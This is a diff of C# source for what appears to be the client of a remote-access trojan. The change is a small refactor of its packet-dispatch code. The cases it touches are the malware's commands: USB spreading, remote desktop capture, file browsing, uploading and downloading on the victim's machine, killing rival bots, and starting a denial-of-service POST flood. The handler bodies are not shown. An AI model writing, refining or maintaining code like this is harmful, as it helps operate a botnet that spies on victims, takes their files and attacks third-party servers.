@@ -113,15 +113,13 @@ namespace Client.Handle_Packet
 
                     case "usbSpread":
                         {
-                            HandleLimeUSB limeUSB = new HandleLimeUSB();
-                            limeUSB.Run();
+                            new HandleLimeUSB().Run(); ;
                             break;
                         }
 
                     case "remoteDesktop":
                         {
-                            HandleRemoteDesktop remoteDesktop = new HandleRemoteDesktop();
-                            remoteDesktop.CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
+                            new HandleRemoteDesktop().CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
                             break;
                         }
 
@@ -150,15 +148,13 @@ namespace Client.Handle_Packet
                             {
                                 case "getDrivers":
                                     {
-                                        FileManager fileManager = new FileManager();
-                                        fileManager.GetDrivers();
+                                        new FileManager().GetDrivers();
                                         break;
                                     }
 
                                 case "getPath":
                                     {
-                                        FileManager fileManager = new FileManager();
-                                        fileManager.GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
+                                        new FileManager().GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
                                         break;
                                     }
 
@@ -176,8 +172,7 @@ namespace Client.Handle_Packet
 
                                 case "reqUploadFile":
                                     {
-                                        FileManager fileManager = new FileManager();
-                                        fileManager.ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString);
+                                        new FileManager().ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString); ;
                                         break;
                                     }
 
@@ -200,17 +195,13 @@ namespace Client.Handle_Packet
 
                     case "socketDownload":
                         {
-                            FileManager fileManager = new FileManager();
-                            string file = unpack_msgpack.ForcePathObject("File").AsString;
-                            string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
-                            fileManager.DownnloadFile(file, dwid);
+                            new FileManager().DownnloadFile(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("DWID").AsString);
                             break;
                         }
 
                     case "botKiller":
                         {
-                            HandleBotKiller botKiller = new HandleBotKiller();
-                            botKiller.RunBotKiller();
+                            new HandleBotKiller().RunBotKiller();
                             break;
                         }
 
@@ -249,9 +240,8 @@ namespace Client.Handle_Packet
                             {
                                 case "postStart":
                                     {
-                                        HandleDos handleDos = new HandleDos();
                                         ctsDos = new CancellationTokenSource();
-                                        handleDos.DosPost(unpack_msgpack);
+                                        new HandleDos().DosPost(unpack_msgpack);
                                         break;
                                     }
 
